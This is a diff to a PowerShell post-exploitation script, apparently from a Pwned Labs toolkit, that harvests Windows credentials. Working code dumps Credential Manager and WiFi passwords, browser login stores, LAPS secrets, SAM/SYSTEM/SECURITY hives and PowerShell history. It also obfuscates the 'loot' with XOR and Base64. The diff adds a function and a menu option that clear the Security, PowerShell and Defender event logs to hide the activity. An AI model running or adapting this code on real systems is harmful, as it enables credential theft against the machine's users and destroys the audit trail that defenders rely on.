@@ -25,152 +25,204 @@ function xor-encode {
     Remove-Item $Path -Force -ErrorAction SilentlyContinue
 }
 
+function Clear-CommonLogs {
+    $logsToClear = @("Security", "System", "Application", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Windows Defender/Operational")
+    foreach ($log in $logsToClear) {
+        try {
+            if ($log -like "Microsoft-*") {
+                wevtutil cl $log 2>$null
+            } else {
+                Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
+            }
+        } catch {}
+    }
+}
+
 function Func-CredManager {
-    Write-Host "[1] Enumerating Windows Credential Manager..." -ForegroundColor Yellow
     try {
         [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
         $vault = New-Object Windows.Security.Credentials.PasswordVault
         $creds = $vault.RetrieveAll()
+        $credList = @()
         $creds | ForEach-Object {
             try { $_.RetrievePassword() } catch {}
-            $_ | Select-Object Resource, UserName, Password | Export-Csv -Path "$outputDir\credman_all.csv" -Append -NoTypeInformation -Encoding utf8
+            $credList += [PSCustomObject]@{
+                Resource = $_.Resource
+                UserName = $_.UserName
+                Password = $_.Password
+            }
         }
-        if (Test-Path "$outputDir\credman_all.csv") {
-            Write-Host "[+] Saved → credman_all.csv" -ForegroundColor Green
+        if ($credList.Count -gt 0) {
+            $credList | ConvertTo-Json -Depth 4 | Out-File "$outputDir\credman.json" -Encoding utf8
+            $credList | Export-Csv "$outputDir\credman.csv" -NoTypeInformation -Encoding utf8
         }
     } catch {}
 }
 
 function Func-CmdKey {
-    Write-Host "[2] Dumping cmdkey..." -ForegroundColor Yellow
-    cmdkey /list | Out-File -FilePath "$outputDir\cmdkey_list.txt" -Encoding ascii
-    if (Test-Path "$outputDir\cmdkey_list.txt") {
-        Write-Host "[+] Saved → cmdkey_list.txt" -ForegroundColor Green
+    $out = cmdkey /list
+    $out | Out-File "$outputDir\cmdkey.txt" -Encoding ascii
+    $parsed = @()
+    $current = @{}
+    foreach ($line in $out) {
+        if ($line -match "^Target:\s*(.+)$") { $current.Target = $matches[1].Trim() }
+        if ($line -match "^Type:\s*(.+)$")   { $current.Type   = $matches[1].Trim() }
+        if ($line -match "^User:\s*(.+)$")   { $current.User   = $matches[1].Trim() }
+        if ($line.Trim() -eq "") {
+            if ($current.Count -gt 0) { $parsed += [PSCustomObject]$current; $current = @{} }
+        }
+    }
+    if ($parsed.Count -gt 0) {
+        $parsed | ConvertTo-Json -Depth 4 | Out-File "$outputDir\cmdkey.json" -Encoding utf8
     }
 }
 
 function Func-WiFi {
-    Write-Host "[3] Extracting WiFi Passwords..." -ForegroundColor Yellow
-    $wifiOut = "$outputDir\wifi_passwords.csv"
+    $wifiList = @()
     (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
         $name = $_.Matches.Groups[1].Value.Trim()
         $key = (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$"
         if ($key) {
-            [PSCustomObject]@{
-                Profile = $name
+            $wifiList += [PSCustomObject]@{
+                Profile  = $name
                 Password = $key.Matches.Groups[1].Value.Trim()
-            } | Export-Csv $wifiOut -Append -NoTypeInformation
+            }
         }
     }
-    if (Test-Path $wifiOut) {
-        Write-Host "[+] Saved → wifi_passwords.csv" -ForegroundColor Green
+    if ($wifiList.Count -gt 0) {
+        $wifiList | ConvertTo-Json -Depth 4 | Out-File "$outputDir\wifi.json" -Encoding utf8
+        $wifiList | Export-Csv "$outputDir\wifi.csv" -NoTypeInformation -Encoding utf8
     }
 }
 
 function Func-RDP {
-    Write-Host "[4] Hunting RDP Credentials..." -ForegroundColor Yellow
-    Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials", "$env:LOCALAPPDATA\Microsoft\Credentials" -Recurse -File -ErrorAction SilentlyContinue |
-        Select FullName, Length, LastWriteTime |
-        Export-Csv "$outputDir\cred_blobs.csv" -NoTypeInformation
+    $blobs = Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials","$env:LOCALAPPDATA\Microsoft\Credentials" -Recurse -File -ErrorAction SilentlyContinue |
+        Select FullName, Length, LastWriteTime, @{Name="Computer";Expression={$env:COMPUTERNAME}}
+    $blobs | ConvertTo-Json -Depth 4 | Out-File "$outputDir\rdp_cred_blobs.json" -Encoding utf8
+    $blobs | Export-Csv "$outputDir\rdp_cred_blobs.csv" -NoTypeInformation
+    reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" /s 2>$null | Out-File "$outputDir\rdp_default.reg.txt"
     reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null | Out-File "$outputDir\rdp_servers.reg.txt"
-    Write-Host "[+] Saved → cred_blobs.csv & rdp_servers.reg.txt" -ForegroundColor Green
 }
 
 function Func-Browsers {
-    Write-Host "[5] Dumping Browser Passwords locations..." -ForegroundColor Yellow
-    $browsers = @(
-        @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
-        @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
-        @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | Select -Last 1 -Expand FullName) + "\logins.json"}
+    $paths = @(
+        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
+        @{Name="Edge";   Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
+        @{Name="Firefox";Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | Select -Last 1 -Expand FullName) + "\logins.json"}
     )
-    foreach ($b in $browsers) {
-        if (Test-Path $b.Path) {
-            $dest = "$outputDir\$($b.Name)_creds"
-            if ($b.Name -eq "Firefox") {
-                Copy-Item $b.Path "$dest.json" -Force
-                Write-Host "[+] $($b.Name) → $($b.Name)_creds.json" -ForegroundColor Green
+    foreach ($p in $paths) {
+        if (Test-Path $p.Path) {
+            $dest = "$outputDir\browser_$($p.Name.ToLower())"
+            if ($p.Name -eq "Firefox") {
+                Copy-Item $p.Path "$dest.json" -Force
             } else {
-                Copy-Item $b.Path "$dest.sqlite" -Force
-                Write-Host "[+] $($b.Name) → $($b.Name)_creds.sqlite" -ForegroundColor Green
+                Copy-Item $p.Path "$dest.sqlite" -Force
             }
         }
     }
 }
 
 function Func-LAPS {
-    Write-Host "[6] Checking LAPS..." -ForegroundColor Yellow
     try {
         Get-ADComputer $env:COMPUTERNAME -Properties ms-Mcs-AdmPwd -ErrorAction Stop |
-            Select -Expand ms-Mcs-AdmPwd |
-            Out-File "$outputDir\laps.txt"
-        if (Test-Path "$outputDir\laps.txt") {
-            Write-Host "[!] LAPS password found → laps.txt" -ForegroundColor Red
-        }
+            Select-Object Name, ms-Mcs-AdmPwd |
+            ConvertTo-Json -Depth 3 |
+            Out-File "$outputDir\laps.json" -Encoding utf8
     } catch {}
 }
 
 function Func-IE {
-    Write-Host "[7] IE/Legacy Edge Passwords..." -ForegroundColor Yellow
     reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" /s 2>$null | Out-File "$outputDir\ie_intelliforms.reg.txt"
-    if (Test-Path "$outputDir\ie_intelliforms.reg.txt") {
-        Write-Host "[+] Saved → ie_intelliforms.reg.txt" -ForegroundColor Green
-    }
+    reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers" /s 2>$null | Out-File "$outputDir\cred_providers.reg.txt"
 }
 
 function Func-Unattended {
-    Write-Host "[8] Unattended/Sysprep Files..." -ForegroundColor Yellow
-    Get-ChildItem -Path "$env:SystemDrive\","C:\Windows\Panther","C:\Windows\System32\sysprep" -Recurse -Include *.xml,*.txt,unattend*,sysprep* -ErrorAction SilentlyContinue |
-        Where-Object { $_.Length -lt 1MB } |
+    Get-ChildItem -Path "C:\","C:\Windows\Panther","C:\Windows\System32\sysprep" -Recurse -Include *.xml,*.txt,unattend*,sysprep* -ErrorAction SilentlyContinue |
+        Where-Object { $_.Length -lt 1MB -and $_.Length -gt 0 } |
         ForEach-Object {
-            Copy-Item $_.FullName "$outputDir\unattend_$($_.Name)" -Force
-            Write-Host "[+] Copied → unattend_$($_.Name)" -ForegroundColor DarkGreen
+            Copy-Item $_.FullName "$outputDir\unattended_$($_.Name)" -Force
         }
 }
 
 function Func-Recent {
-    Write-Host "[9] Recent Activity..." -ForegroundColor Yellow
-    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Recurse -ErrorAction SilentlyContinue |
-        Select FullName, LastWriteTime |
-        Export-Csv "$outputDir\recent.csv" -NoTypeInformation
+    $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Recurse -ErrorAction SilentlyContinue |
+        Select FullName, LastWriteTime, Length
+    $recent | ConvertTo-Json -Depth 4 | Out-File "$outputDir\recent_files.json" -Encoding utf8
+    $recent | Export-Csv "$outputDir\recent_files.csv" -NoTypeInformation
     reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s 2>$null | Out-File "$outputDir\runmru.txt"
-    Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" "$outputDir\ps_history.txt" -ErrorAction SilentlyContinue
-    Write-Host "[+] Saved → recent.csv, runmru.txt, ps_history.txt" -ForegroundColor Green
+    Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" "$outputDir\powershell_history.txt" -ErrorAction SilentlyContinue
 }
 
 function Func-Hives {
-    Write-Host "[10] SAM/SYSTEM/SECURITY Hives..." -ForegroundColor Yellow
-    reg save HKLM\SAM     "$outputDir\SAM"     2>$null
-    reg save HKLM\SYSTEM  "$outputDir\SYSTEM"  2>$null
-    reg save HKLM\SECURITY "$outputDir\SECURITY" 2>$null
-    if (Test-Path "$outputDir\SAM") {
-        Write-Host "[!] Registry hives saved → SAM, SYSTEM, SECURITY" -ForegroundColor Red
-    }
+    reg save HKLM\SAM     "$outputDir\sam.hive"     2>$null
+    reg save HKLM\SYSTEM  "$outputDir\system.hive"  2>$null
+    reg save HKLM\SECURITY "$outputDir\security.hive" 2>$null
+}
+
+function Func-Dpapi {
+    Get-ChildItem -Path "$env:APPDATA\Microsoft\Protect", "$env:LOCALAPPDATA\Microsoft\Protect" -Recurse -File -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -match '^[0-9a-f]{40}$' } |
+        Select FullName, Length, LastWriteTime |
+        ConvertTo-Json -Depth 4 |
+        Out-File "$outputDir\dpapi_masterkeys.json" -Encoding utf8
+}
+
+function Func-LsassDumpHint {
+    Get-Process -Name lsass -ErrorAction SilentlyContinue |
+        Select Id, StartTime, Path, @{Name="Session";Expression={$_.SessionId}} |
+        ConvertTo-Json -Depth 3 |
+        Out-File "$outputDir\lsass_process.json" -Encoding utf8
+    Get-Service -Name seclogon -ErrorAction SilentlyContinue | Select Name, Status, StartType | ConvertTo-Json | Out-File "$outputDir\seclogon.json" -Encoding utf8
+}
+
+function Func-ScheduledTasksCreds {
+    Get-ScheduledTask | Where-Object { $_.Principal.UserId -or $_.Principal.LogonType -eq "Password" } |
+        Select TaskName, TaskPath, Principal, @{Name="User";Expression={$_.Principal.UserId}}, @{Name="LogonType";Expression={$_.Principal.LogonType}} |
+        ConvertTo-Json -Depth 4 |
+        Out-File "$outputDir\scheduled_tasks_creds.json" -Encoding utf8
+}
+
+function Func-RDPThiefArtifacts {
+    Get-ChildItem -Path "C:\Windows\Temp","C:\Users\*\AppData\Local\Temp" -Recurse -Include *rdp*,*mstsc*,*termsrv* -ErrorAction SilentlyContinue |
+        Select FullName, Length, LastWriteTime |
+        ConvertTo-Json -Depth 4 |
+        Out-File "$outputDir\rdp_temp_artifacts.json" -Encoding utf8
+}
+
+function Func-Winlogon {
+    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /s 2>$null |
+        Out-File "$outputDir\winlogon.reg.txt"
 }
 
 function Show-Menu {
     Clear-Host
     Write-Host @"
 ╔═══════════════════════════════════════════════════════════════════════════╗
-║          RDP Credential Enumeration Toolkit - 2026                        ║
-║                        Pwned Labs | @maverickx64                          ║
+║ RDP Credential Enumeration Toolkit - 2026 ║
+║ Pwned Labs | @maverickx64 ║
 ╚═══════════════════════════════════════════════════════════════════════════╝
 "@ -ForegroundColor Cyan
-
     Write-Host "Select an option:" -ForegroundColor Yellow
-    Write-Host "1. Windows Credential Manager"
-    Write-Host "2. cmdkey / network credentials"
-    Write-Host "3. WiFi Passwords"
-    Write-Host "4. RDP Credentials"
-    Write-Host "5. Browser Passwords"
-    Write-Host "6. LAPS Password"
-    Write-Host "7. IE/Legacy Edge Passwords"
-    Write-Host "8. Unattended/Sysprep Files"
-    Write-Host "9. Recent Activity & PS History"
-    Write-Host "10. SAM/SYSTEM/SECURITY Hives"
-    Write-Host "A. Run All"
-    Write-Host "E. Encode all loot (XOR+Base64)"
-    Write-Host "0. Exit"
-
+    Write-Host " 1. Windows Credential Manager"
+    Write-Host " 2. cmdkey / network credentials"
+    Write-Host " 3. WiFi Passwords"
+    Write-Host " 4. RDP Credentials & servers"
+    Write-Host " 5. Browser Passwords (files)"
+    Write-Host " 6. LAPS Password"
+    Write-Host " 7. IE / Legacy Edge / Cred Providers"
+    Write-Host " 8. Unattended & Sysprep Files"
+    Write-Host " 9. Recent Files & PowerShell History"
+    Write-Host "10. SAM / SYSTEM / SECURITY Hives"
+    Write-Host "11. Clear common event logs"
+    Write-Host "12. DPAPI master key locations"
+    Write-Host "13. LSASS process & seclogon status"
+    Write-Host "14. Scheduled Tasks with stored creds"
+    Write-Host "15. RDP-related temp artifacts"
+    Write-Host "16. Winlogon registry keys"
+    Write-Host " A. Run All Enumeration"
+    Write-Host " B. Run All + Clear Logs"
+    Write-Host " E. Encode all loot (XOR + Base64)"
+    Write-Host " 0. Exit"
     $choice = Read-Host "Enter choice"
     return $choice
 }
@@ -194,6 +246,12 @@ do {
         '8'  { Func-Unattended }
         '9'  { Func-Recent }
         '10' { Func-Hives }
+        '11' { Clear-CommonLogs }
+        '12' { Func-Dpapi }
+        '13' { Func-LsassDumpHint }
+        '14' { Func-ScheduledTasksCreds }
+        '15' { Func-RDPThiefArtifacts }
+        '16' { Func-Winlogon }
         'A'  {
             Func-CredManager
             Func-CmdKey
@@ -205,37 +263,45 @@ do {
             Func-Unattended
             Func-Recent
             Func-Hives
-            Write-Host "`nEnumeration Complete!" -ForegroundColor Cyan
+            Func-Dpapi
+            Func-LsassDumpHint
+            Func-ScheduledTasksCreds
+            Func-RDPThiefArtifacts
+            Func-Winlogon
+        }
+        'B'  {
+            Func-CredManager
+            Func-CmdKey
+            Func-WiFi
+            Func-RDP
+            Func-Browsers
+            Func-LAPS
+            Func-IE
+            Func-Unattended
+            Func-Recent
+            Func-Hives
+            Func-Dpapi
+            Func-LsassDumpHint
+            Func-ScheduledTasksCreds
+            Func-RDPThiefArtifacts
+            Func-Winlogon
+            Clear-CommonLogs
         }
         'E'  {
-            Write-Host "Encoding all files in loot folder..." -ForegroundColor Magenta
             Get-ChildItem $outputDir -File | ForEach-Object {
                 xor-encode $_.FullName
             }
-            Write-Host "[+] All files encoded to .xor64 and originals removed" -ForegroundColor Magenta
         }
         '0'  { break }
     }
-
     if ($choice -ne '0') {
-        Write-Host "`nPress any key to continue..." -ForegroundColor Magenta
         $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     }
 } while ($choice -ne '0')
 
 Write-Host @"
 Finished.
-
-All files are saved in plain text format in:
-$outputDir
-
-Optional: Type 'E' in the menu to XOR-encode + Base64 all files (creates .xor64 copies and deletes originals)
-
-Decode example (if encoded):
-`$bytes = [Convert]::FromBase64String((Get-Content file.xor64 -Raw))
-for(`$i=0; `$i -lt `$bytes.Length; `$i++) { `$bytes[`$i] = `$bytes[`$i] -bxor 0x42 }
-`$bytes | Set-Content -Path decoded.bin -Encoding Byte`
-
-Zip the folder and exfiltrate.
+Loot saved in: $outputDir
+Use 'E' to XOR-encode + Base64 all files
 Pwned Labs | @maverickx64
 "@ -ForegroundColor Cyan
